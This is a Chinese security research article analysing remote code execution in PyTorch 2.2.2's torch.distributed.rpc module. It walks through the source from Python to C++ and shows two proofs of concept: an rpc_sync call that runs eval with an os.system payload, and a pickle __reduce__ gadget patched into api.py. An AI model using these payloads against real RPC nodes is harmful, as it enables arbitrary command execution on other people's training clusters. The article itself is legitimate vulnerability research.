# 深度解析pytorch rpc模块rce-先知社区

> **来源**: https://xz.aliyun.com/news/18644  
> **文章ID**: 18644

---

笔者最近在了解ai相关的内容。pytorch作为深度学习领域极具影响力的框架，自然是避不开的。上网搜索pytorch相关的漏洞，网上大部分都是对于rpc框架反序列化漏洞和命令注入漏洞的公告。这两个漏洞评分都在9分网上，公开了一段时间了，但是poc寥寥无几，网上也没有对此的分析，而且其中一个漏洞的cve编号被撤销了，这引发了笔者的好奇心，遂开始以下分析探索。

# 前言

PyTorch是一个专门用来做机器学习和深度学习的 Python 库，简单说就是帮你更轻松地搭建、训练和使用人工智能模型（比如图像识别、语音处理、生成文字或图片等）其中，torch.distributed.rpc框架通常用于分布式训练场景，如强化学习、模型并行和参数服务器训练框架

以下实验环境为ubuntu2024，torch=2.2.2，cpu

仅以master和worker两个节点为例

|  |  |
| --- | --- |
| master | 192.168.140.210 |
| worker | 192.168.140.207 |

/etc/hosts配置

例如

```
127.0.0.1 localhost
192.168.140.210 Ubuntu
192.168.140.210 master
192.168.140.207 worker
```

配置Gloo通信端口为虚拟机的网络接口

```
export GLOO_SOCKET_IFNAME=ens33
```

注意：

各个节点的pytorch版本，编译情况尽量保持一致，以免出现api不对应导致无法正常运行的情况

# 背景

pytorch框架中有三类核心 API—— 同步（rpc\_sync）、异步（rpc\_async）和远程引用创建（remote）—— 各有明确的适用场景。同步调用（rpc\_sync）适用于需要立即获取结果才能继续执行的情况；异步调用（rpc\_async）则会返回一个 "Future" 对象（可理解为未来结果的占位符），允许调用者先处理其他任务，待需要时再通过这个 Future 获取远程执行的结果，实现延迟处理；而 remote API 的独特之处在于，它专门用于在远程节点创建对象并返回其引用（RRef），却不会将对象本身传输到本地。

以下是常用的函数

```
torch.distributed.rpc.init_rpc(name, backend=None, rank=-1, world_size=None, rpc_backend_options=None)[source]
```

init\_rpc：RPC 框架的初始化入口，用于设置当前进程的 RPC 环境。需指定全局唯一的节点名称（name）、进程排名（rank）和总进程数（world\_size），可配置 RPC 后端（默认 TensorPipe）及后端选项（rpc\_backend\_options）。初始化后，当前进程即可发送和接收 RPC 请求，并启用 RRef 和分布式 autograd 功能。

```
torch.distributed.rpc.rpc_sync(to, func, args=None, kwargs=None, timeout=-1.0)
```

rpc\_sync：同步 RPC 调用函数，在目标 worker（to）上执行指定函数（func）并阻塞等待结果。支持传递位置参数（args）和关键字参数（kwargs），可设置超时时间（timeout）。适用于需要立即获取结果才能继续执行的场景，返回值为远程函数的执行结果。

```
torch.distributed.rpc.rpc_async(to, func, args=None, kwargs=None, timeout=-1.0)[source]
```

rpc\_async：异步 RPC 调用函数，在目标 worker 上执行函数但不阻塞当前进程，立即返回一个Future对象。通过该对象可在需要时等待结果，实现非阻塞式通信。参数与rpc\_sync类似，适用于无需立即获取结果、可并行处理其他任务的场景。

下面是利用rpc框架进行分布式训练的简单例子

主节点：初始化训练参数和模型，将数据与模型参数发送给工作节点，注册一个接收梯度的函数，在收到梯度后更新模型参数。

```
import torch
import torch.nn as nn
import torch.optim as optim
import torch.distributed.rpc as rpc
import time

# 定义简单的全连接神经网络模型，主节点和工作节点都需要
class SimpleNet(nn.Module):
    def __init__(self):
        super(SimpleNet, self).__init__()
        self.fc1 = nn.Linear(10, 20)
        self.fc2 = nn.Linear(20, 1)

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = self.fc2(x)
        return x

# 工作节点训练函数，主节点也需要知道这个函数的签名才能进行RPC调用
def train_on_worker(model_state_dict, inputs, targets):
    model = SimpleNet()
    model.load_state_dict(model_state_dict)
    criterion = nn.MSELoss()
    optimizer = optim.SGD(model.parameters(), lr=0.01)

    outputs = model(inputs)
    loss = criterion(outputs, targets)
    loss.backward()

    grads = {}
    for name, param in model.named_parameters():
        # 确保梯度存在且不是None
        if param.grad is not None:
            grads[name] = param.grad.clone()

    # 将梯度返回给主节点
    # rpc.rpc_sync 是同步调用，会阻塞直到收到响应
    response = rpc.rpc_sync("master", receive_grads, args=(grads,))
    print(f"Worker received master's response: {response}")
    return "Training on worker completed"

# 接收工作节点返回梯度的函数，仅在主节点运行
def receive_grads(grads):
    global model, optimizer
    # 清空之前的梯度
    optimizer.zero_grad()
    # 应用工作节点计算的梯度
    for name, param in model.named_parameters():
        # 确保梯度存在
        if name in grads:
            # 使用原地操作来更新梯度，这更高效
            param.grad = grads[name]
    # 更新模型参数
    optimizer.step()
    print("Gradients applied and model updated.")
    return "Gradients applied"

def run_master():
    global model, optimizer
    # 初始化主节点
    options = rpc.TensorPipeRpcBackendOptions(
        init_method="tcp://192.168.140.210:29500"
    )
    rpc.init_rpc(
        name="master",
        rank=0,
        world_size=2,
        rpc_backend_options=options
    )

    print("Master node initialized.")

    # 创建模型和优化器
    model = SimpleNet()
    optimizer = optim.SGD(model.parameters(), lr=0.01)

    # 模拟训练数据
    num_samples = 100
    inputs = torch.randn(num_samples, 10)
    targets = torch.randn(num_samples, 1)

    num_epochs = 5
    batch_size = 10

    # 异步RPC调用列表
    futs = []

    for epoch in range(num_epochs):
        for i in range(0, num_samples, batch_size):
            batch_inputs = inputs[i:i+batch_size]
            batch_targets = targets[i:i+batch_size]

            # 异步RPC调用，将数据和模型参数发送到工作节点
            fut = rpc.rpc_async(
                "worker",
                train_on_worker,
                args=(model.state_dict(), batch_inputs, batch_targets)
            )
            futs.append(fut)

        print(f"Epoch {epoch + 1} started training with async calls.")

    # 等待所有异步任务完成
    print("Waiting for all RPCs to complete...")
    for fut in futs:
        fut.wait()
    print("All RPCs completed.")

    print("Final model parameters:")
    for name, param in model.named_parameters():
        print(f"Parameter {name}: {param.data}")

    # 等待一段时间，确保所有消息都处理完毕
    time.sleep(300)
    
    rpc.shutdown()

if __name__ == "__main__":
    run_master()
```

工作节点：接收主节点的任务，进行前向传播和反向传播计算梯度，然后调用主节点的函数返回梯度

```
import torch
import torch.nn as nn
import torch.optim as optim
import torch.distributed.rpc as rpc
import time

# 定义 SimpleNet 类，主节点和工作节点都需要
class SimpleNet(nn.Module):
    def __init__(self):
        super(SimpleNet, self).__init__()
        self.fc1 = nn.Linear(10, 20)
        self.fc2 = nn.Linear(20, 1)

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = self.fc2(x)
        return x

# 工作节点训练函数，主节点也需要知道这个函数的签名才能进行RPC调用
def train_on_worker(model_state_dict, inputs, targets):
    print("start working.....")
    model = SimpleNet()
    model.load_state_dict(model_state_dict)
    criterion = nn.MSELoss()
    optimizer = optim.SGD(model.parameters(), lr=0.01)

    outputs = model(inputs)
    loss = criterion(outputs, targets)
    loss.backward()

    grads = {}
    for name, param in model.named_parameters():
        if param.grad is not None:
            grads[name] = param.grad.clone()

    # 将梯度返回给主节点，并等待响应
    response = rpc.rpc_sync("master", receive_grads, args=(grads,))
    print(f"Worker received master's response: {response}")
    return "Training on worker completed"

# ❗ 关键修正：在 worker.py 中添加 receive_grads 的定义 ❗
# 尽管此函数不会在 worker 上被实际调用，但 RPC 机制需要其存在。
# 我们可以让它抛出异常，以防万一它被错误地调用。
def receive_grads(grads):
    raise NotImplementedError("This function should only be called on the master node.")

def run_worker():
    # 初始化工作节点
    options = rpc.TensorPipeRpcBackendOptions(
        init_method="tcp://192.168.140.210:29500"
    )
    rpc.init_rpc(
        name="worker",
        rank=1,
        world_size=2,
        rpc_backend_options=options
    )

    print("Worker node initialized.")
    # 因为 master 会向 worker 发起 RPC 调用，worker 只需要保持运行，等待 RPC 请求即可
    print("Worker is ready to receive RPCs. Waiting for tasks...")
    # 这里我们让它保持运行一段时间
    time.sleep(300)
    
    rpc.shutdown()

if __name__ == "__main__":
    run_worker()
```

运行情况

![image.png](images/20250819113506-8006d81e-7cad-1.png)

![image.png](images/20250819113507-805c53fe-7cad-1.png)

# 概念验证

## 命令注入

在使用torch.distributed.rpc进行远程过程调用时，该框架不会验证调用的函数是否为开发者预期的函数。这就使得攻击者可以通过网络进行 RPC 调用，调用 Python 内置函数（如eval），并加载其他 Python 库来执行任意命令。

该漏洞影响PyTorch 2.2.2及以下版本

master节点只保持接收监听即可

```
import torch
import torch.distributed.rpc as rpc


def main():
    # 初始化主节点
    options = rpc.TensorPipeRpcBackendOptions(
        init_method="tcp://192.168.140.210:29500"
    )
    rpc.init_rpc(
        name="master",
        rank=0,
        world_size=2,
        rpc_backend_options=options
    )
    print("Master node initialized")

    # 保持运行以接收 RPC 请求
    import time
    time.sleep(60)  # 等待工作节点发送请求

    rpc.shutdown()

if __name__ == "__main__":
    main()

```

worker 发eval函数并具体命令作为参数

```
import torch
import torch.distributed.rpc as rpc
import os
import pickle


def main():
    # 初始化工作节点，连接到主节点
    options = rpc.TensorPipeRpcBackendOptions(
        init_method="tcp://192.168.140.210:29500"
    )
    rpc.init_rpc(
        name="worker",
        rank=1,
        world_size=2,
        rpc_backend_options=options
    )

    print("Worker node initialized")

    #  发送恶意的 PythonUDF 到主节点
    try:
        result = rpc.rpc_sync("master", eval, args=('__import__("os").system("id;ifconfig")',))
        print("Malicious payload sent, result:", result)
    except Exception as e:
        print(f"Error during RPC call: {e}")

    # 关闭 RPC
    rpc.shutdown()

if __name__ == "__main__":
    main()

```

结果是，工作节点利用该漏洞在主节点上调用了 Python 内置函数（如eval），并执行了任意命令，如os.system("id;ifconfig")

![image.png](images/20250819113507-80810106-7cad-1.png)

![image.png](images/20250819113507-80b7e430-7cad-1.png)

## 反序列化

来到pytorch源码中的torch/distributed/rpc/api.py

![image.png](images/20250819113508-80f40174-7cad-1.png)

修改部分代码

```
            #(pickled_python_udf, tensors) = _default_pickler.serialize(
            #    PythonUDF(func, args, kwargs)
            #)
            import os
            class Unsec(object):
                def __reduce__(self):
                    return (os.system,('ifconfig',))
            (pickled_python_udf, tensors) = _default_pickler.serialize(
                Unsec()
            )
            fut = _invoke_rpc_python_udf(
                dst_worker_info,
                pickled_python_udf,
                tensors,
                rpc_timeout,
                is_async_exec
            )
```

攻击者使用worker.py正常加入分布式 RPC 环境，并可以通过rpc\_sync函数在主节点上调用函数即可触发反序列化漏洞，执行任意代码。

# 分析调试

为了更好地对该漏洞的成因进行分析，下面选择先编译调试python源码

## 编译pytorch

推荐使用[Anaconda](https://zhida.zhihu.com/search?content_id=188261519&content_type=Article&match_order=1&q=Anaconda&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NTUwNjkzNTAsInEiOiJBbmFjb25kYSIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjE4ODI2MTUxOSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.fGWD-Jahx9UmQxMm4NrinMHcYdj2mTwtLwUM3nYvQqc&zhida_source=entity)建立Python虚拟环境，避免污染系统Python环境

```
wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh 
bash Miniconda3-latest-Linux-x86_64.sh
```

在安装过程中，按照提示操作。特别要注意在询问是否将 Miniconda 路径添加到 .bashrc 时选择 “yes”。

本文选择创建python3.9的环境

```
conda create -n py39 python=3.9
conda activate py39
```

拉取源码

```
git clone --recursive --branch v2.2.2 https://github.com/pytorch/pytorch
```

pytorch源码较大，可能时间会比较长，可以设置一下代理

例如

```
HTTP_PROXY=http://192.168.1.8:7890 HTTPS_PROXY=http://192.168.1.8:7890
NO_PROXY=localhost,127.0.0.1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,192.168.140.209
```

拉取下来后即可开始编译

在编译的时候注意加入DEBUG信息，这里在python命令前面加DEBUG=1的环境变量，相当于GCC中的-g -O0，保留调试信息。特别要注意加入USE\_DISTRIBUTED。若未设置该变量，编译产物中会缺少 RPC 相关的代码和符号，导致无法使用 torch.distributed.rpc。

```
export CMAKE_PREFIX_PATH=${CONDA_PREFIX:-"$(dirname $(which conda))/../"}
DEBUG=1 USE_DISTRIBUTED=1 USE_MKLDNN=0 USE_CUDA=0 BUILD_TEST=0 USE_FBGEMM=0 USE_NNPACK=0 USE_QNNPACK=0 USE_XNNPACK=0 python setup.py develop
```

成功编译

![image.png](images/20250819113508-811c0d48-7cad-1.png)

可能的问题：

1.缺少numpy库，或者arrayobject.h路径不对

![](images/20260326211029-29e11a1a-2915-1.png)

```
conda install numpy
```

依然报错，可能原因

编译器在寻找 numpy/\_core/include 目录，而实际上arrayobject.h 位于numpy/core/include目录下

解决：

创建一个软链接（Soft Link）来修正路径

```
cd /root/miniconda3/envs/py39/lib/python3.9/site-packages/numpy/
ln -s core _core
```

2.libstdc++.so.6 库缺少 GLIBCXX\_3.4.30 版本符号

![](images/20260326211030-2a2776e9-2915-1.png)

解决

如果 Ubuntu 系统本身的 libstdc++.so.6 版本较高（例如通过 sudo apt install libstdc++6 升级过），可将 conda 环境的库替换为系统库：

```
# 先备份 conda 环境中的旧库
mv /root/miniconda3/envs/py39/lib/libstdc++.so.6 /root/miniconda3/envs/py39/lib/libstdc++.so.6.bak

# 链接系统中的高版本库（系统库通常在 /usr/lib/x86_64-linux-gnu/）
ln -s /usr/lib/x86_64-linux-gnu/libstdc++.so.6 /root/miniconda3/envs/py39/lib/libstdc++.so.6
```

## vscode调试

PyTorch 代码含 Python 与 C++ 两部分，前者在解释器中执行字节码，后者以二进制机器码运行。调试器通过替换目标代码为异常处理逻辑实现断点功能：GDB 针对 C++ 二进制代码，Python 调试器则操作字节码。

调试时，Python 调试器启动程序，执行至PyTorch调用时会进入其C++扩展（共享库）。此时可通过GDB附加到该 Python 进程，在C++代码段触发断点。

VS Code的Python调试依赖debugpy，采用服务端/客户端模型，含 launcher、debugpy、adapter三个进程，调试C++部分时需用GDB附加至debugpy进程。

root模式启动vscode

```
/usr/bin/code --no-sandbox --user-data-dir=/root/.vscode-root
```

python层调试

点击create a launch.json file -> Python -> Python File（或者点击Run->Add Configuration...），就新建了一个launch.json文件

选择python debugger即可

![image.png](images/20250819113508-814b7e98-7cad-1.png)

c++层调试

安装扩展

![image.png](images/20250819113509-81678bcc-7cad-1.png)

在PyTorch源码窗口，创建一个默认的launch.json文件，然后点击右下方的Add Configurations，选择"C/C++: (gdb) Attach"新建一个GDB attach工作方式的配置文件。然后将program配置为你工作的python路径。

![image.png](images/20250819113509-81959be8-7cad-1.png)

![image.png](images/20250819113509-81e6437e-7cad-1.png)

先运行python代码，然后开启另一个vscode窗口，打开pytorch，在里面下好断点，搜索对应运行的代码

附加到第二个即可

![image.png](images/20250819113510-823e5962-7cad-1.png)

## 漏洞分析

先来分析worker节点

### worker

payload是在rpc\_sync中传入的

![image.png](images/20250819113510-8276eff0-7cad-1.png)

键入rpc\_sync，

发现rpc\_sync和rpc\_async函数体写在临近的位置，最终都会调用\_invoke\_rpc

![image.png](images/20250819113511-829c9028-7cad-1.png)

进入\_invoke\_rpc

![image.png](images/20250819113511-82d2ae80-7cad-1.png)

Genimi对代码分析如下：

* `_invoke_rpc` 使用一个 `with` 语句来管理性能分析器的上下文。在 `with` 块内部，函数根据 `func` 的类型决定如何进行远程调用。
* 它首先检查 `is_async_exec` 标志，该标志表明这个调用是否是一个异步 RPC。
* **情况一：内置函数**
* 如果 `qualified_name` 非空，表明 `func` 是一个内置的 C++ 函数。
* 函数调用 `_invoke_rpc_builtin`。这个函数使用一个高效的内置机制来调用远程函数，避免了 Python 对象的序列化开销。
* 这个路径通常用于 PyTorch 内部的分布式通信，如梯度聚合等。
* **情况二：TorchScript 函数**
* 如果 `qualified_name` 为空，且 `func` 是 `torch.jit.ScriptFunction` 的实例。
* 函数调用 `_invoke_rpc_torchscript`。
* TorchScript 模型在序列化和反序列化时比普通 Python 函数更高效，因为它们是优化的图表示。
* **情况三：普通 Python 函数**
* 如果以上两种情况都不满足，那么 `func` 就是一个普通的 Python 可调用对象。
* 函数首先使用 `_default_pickler.serialize` 将 `func` 和它的参数（`PythonUDF(func, args, kwargs)`）序列化为字节串 (`pickled_python_udf`) 和张量 (`tensors`)。
* 随后，调用 `_invoke_rpc_python_udf` 将这些序列化后的数据发送到远程工作节点。远程节点会反序列化这些数据，并执行相应的函数。

我们这里是第三种情况，简单来说就是当PyTorch的RPC框架需要调用一个普通的 Python 函数时，它会将该函数及其参数打包成一个PythonUDF对象。这个对象随后会被序列化并通过网络发送到远程工作节点

![image.png](images/20250819113511-82ed5be2-7cad-1.png)

为了确定判断，下面分别在serialize和\_invoke\_rpc\_python\_udf处打上断点进行调试

发现确实是经过了serialize和\_invoke\_rpc\_python\_udf，不过第一次发送的内容不是payload

![image.png](images/20250819113511-8320d7d8-7cad-1.png)

第一次调用的是 \_gather\_to\_leader

这个函数的主要作用是同步所有参与分布式任务的工作节点，并在所有节点都已提交数据后触发下一步操作

![image.png](images/20250819113512-835ce438-7cad-1.png)

点击continue,程序又会再次来到serialize和\_invoke\_rpc\_python\_udf，第二次序列化发送的就是payload了

![](images/20260326211030-2a718b8b-2915-1.png)

这个\_invoke\_rpc\_python\_udf已经无法再通过ctrl+点击进入了，说明\_invoke\_rpc\_python\_udf调用的是c++层的接口

python毕竟是脚本，性能还是有限的，在一些对性能要求高的情景下面，还是需要使用c/c++来完成

在 PyTorch 中，将 C++ 函数绑定到 Python 模块是实现 Python与C++交互的重要方式，而 PYBIND11\_MODULE 宏正是 pybind11 库提供的核心机制，用于创建这样的绑定。

详情参考官方文档：<https://docs.pytorch.org/tutorials/advanced/cpp_extension.html>

![image.png](images/20250819113512-83b87a82-7cad-1.png)

具体绑定代码常出现在 torch/csrc/distributed/rpc/init.cpp,它主要用于为Python接口提供声明和类型提示，但并不包含具体的实现代码

在init.cpp中搜索\_invoke\_rpc\_python\_udf，可以发现

该绑定定义了一个名为 \_invoke\_rpc\_python\_udf 的 Python 可调用函数，其作用是：

将序列化的Python自定义函数、输入张量等参数传递给底层C++函数pyRpcPythonUDF，发起远程 RPC 调用，并返回一个封装了异步结果的PythonFutureWrapper对象。

![image.png](images/20250819113513-840116c0-7cad-1.png)

搜索这个pyRpcPythonUDF定义的位置 ，发现函数体在python\_function.cpp中

![image.png](images/20250819113513-84255a62-7cad-1.png)

不难分析这个函数的作用：

1. 将序列化的Python函数和输入张量封装到SerializedPyObj结构体
2. 用 PythonCall包装序列化数据和执行模式（同步 / 异步），该对象负责后续的消息序列化和远程执行逻辑
3. 使用sendMessageWithAutograd将 PythonCall 转换为 RPC 消息，通过RpcAgent发送到目标节点（dst）

![image.png](images/20250819113513-8455500a-7cad-1.png)

打个断点，调试一下，发现确实会定在这个位置

![](images/20260326211031-2acec3ba-2915-1.png)

到这里就追溯了发送payload的大体链路，这条路径没有对发送的函数进行限制，实际上也没有必要进行限制

这条路径的核心在于将函数和张量序列化并打包成PythonUDF，然后通过PythonCall发送

真正应该设限的应该是在接收后反序列化及执行部分

下面从master.py的角度分析接收执行过程

### master

在 PyTorch 的分布式训练中，TensorPipeAgent 是基于TensorPipe库实现的RPC代理

![image.png](images/20250819113514-847abc14-7cad-1.png)

onListenerAccepted() 函数通常是在监听套接字接收到新的连接请求时被调用。

onListenerAccepted() 接受新连接并初始化管道后，会触发后续的请求处理逻辑。通常会调用 respond() 函数开始处理客户端发送的 RPC 请求

![image.png](images/20250819113514-8497eda2-7cad-1.png)

![image.png](images/20250819113514-84ca15c0-7cad-1.png)

respond函数大概是负责从指定的 tensorpipe::Pipe 读取请求消息，对请求进行处理，然后将处理结果作为响应消息发送回客户端

关注到这段代码

cb\_ 对象的函数调用运算符operator()来处理接收到的RPC请求消息requestMessage，返回一个响应信息，想看看这个运行符的具体实现

![image.png](images/20250819113514-84e5ba28-7cad-1.png)

向上寻找，发现cb是TensorPipeAgent构造函数的参数，属于RequestCallback类的

![image.png](images/20250819113515-8506e0cc-7cad-1.png)

搜索来到RequestCallback类

![image.png](images/20250819113515-8526743a-7cad-1.png)

进入request\_callback\_no\_python.cpp的processMessage函数，发现先进行了反序列化然后进行了函数执行，下面分开分析

#### 反序列化

![image.png](images/20250819113515-85539e12-7cad-1.png)

查看里面的deserializeRequest函数，发现里面是先从request中取出PythonCall对象，不涉及反序列化，那就看外层的deserializePythonRpcCommand

![image.png](images/20250819113515-85709f4c-7cad-1.png)

request\_callback\_impl.cpp中的

根据英文不难看出这个UnpickledPythonCall类型跟解包PythonCall对象有关

![image.png](images/20250819113516-8592268c-7cad-1.png)

进入查看，发现deserialize函数

![image.png](images/20250819113516-85b28e9a-7cad-1.png)

进入deserialize函数

![image.png](images/20250819113516-85d07db0-7cad-1.png)

进入pyDeserialize\_函数

![image.png](images/20250819113516-85edadf4-7cad-1.png)

getFunction函数定义在当前文件的匿名命名空间中，其功能是从指定的Python模块里获取一个函数对象，也就是说pyDeserialize\_是调用了python层的函数deserialize

![image.png](images/20250819113516-860be1e8-7cad-1.png)

往上看发现rpcInternal是import(kInternalModule) 导入的 Python 模块对象。kInternalModule被定义为 "torch.distributed.rpc.internal"，所以rpcInternal代表torch.distributed.rpc.internal这个Python模块。

![image.png](images/20250819113516-861b1906-7cad-1.png)

![image.png](images/20250819113517-8629967a-7cad-1.png)

查看torch.distributed.rpc.internal

![image.png](images/20250819113517-8642e6d4-7cad-1.png)

继续进入

这里是非常经典的pickle反序列化漏洞点，unpickler.load()会执行被反序列化对象中的任意代码

![image.png](images/20250819113517-86796038-7cad-1.png)

到此反序列化漏洞的就弄清楚原因了

#### 命令注入

![image.png](images/20250819113517-869dd0f8-7cad-1.png)

查看proceeRpcWithErrors

![image.png](images/20250819113518-86c1ce0c-7cad-1.png)

继续键入，根据分析应该是走pythonCall这一case，为了确保判断准确，下个断点，发现确实是走到了这里

![image.png](images/20250819113518-86e4cb5c-7cad-1.png)

继续进入查看

![image.png](images/20250819113518-87176fe4-7cad-1.png)

查看runPythonFunction,发现还存在进一步调用, 开始对PythonUDF进行处理了

![image.png](images/20250819113518-873fa57a-7cad-1.png)

查看runPythonUdf

![image.png](images/20250819113519-876385f0-7cad-1.png)

这里跟反序列化是一样的，同样是导入了python模块，引入了python层的函数

![image.png](images/20250819113519-877ff818-7cad-1.png)

查看一下\_run\_function,好家伙，这里就是直接执行了pythonUdf对象的函数，也是没有任何限制和校验

![image.png](images/20250819113519-87ac7da8-7cad-1.png)

到此命令注入的成因也捋清楚了

# 修复？

翻看更新的版本，发现貌似pytorch团队并没有修复。

如下图，笔者又尝试了2.4.1版本，运行poc，仍然能触发以上两个漏洞

![image.png](images/20250819113519-87da753e-7cad-1.png)

后来查阅github，这是由于官方可能认为：

PyTorch的RPC模块主要用于分布式训练场景，通常运行在可信环境中（如企业内部集群、研究机构的私有网络）。该模块的设计假设是 “用户对集群有完全控制权”，因此更侧重于功能实现（如分布式通信效率），而将环境隔离、访问控制等安全责任交给了部署者

不过笔者认为即使是可信环境，这样可以用于横向移动的漏洞依旧是可以造成风险的
